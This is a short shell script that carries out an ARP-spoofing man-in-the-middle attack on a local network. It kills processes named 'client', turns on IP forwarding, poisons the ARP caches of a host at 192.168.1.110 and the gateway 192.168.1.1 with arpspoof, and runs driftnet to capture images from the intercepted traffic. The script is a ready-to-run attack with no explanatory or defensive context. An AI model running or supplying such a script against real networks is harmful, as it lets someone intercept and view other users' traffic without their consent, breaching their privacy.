#!/bin/sh

ps -aux |grep client | cut -c 1-5 | xargs kill -9
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.110
sudo driftnet -i eth0


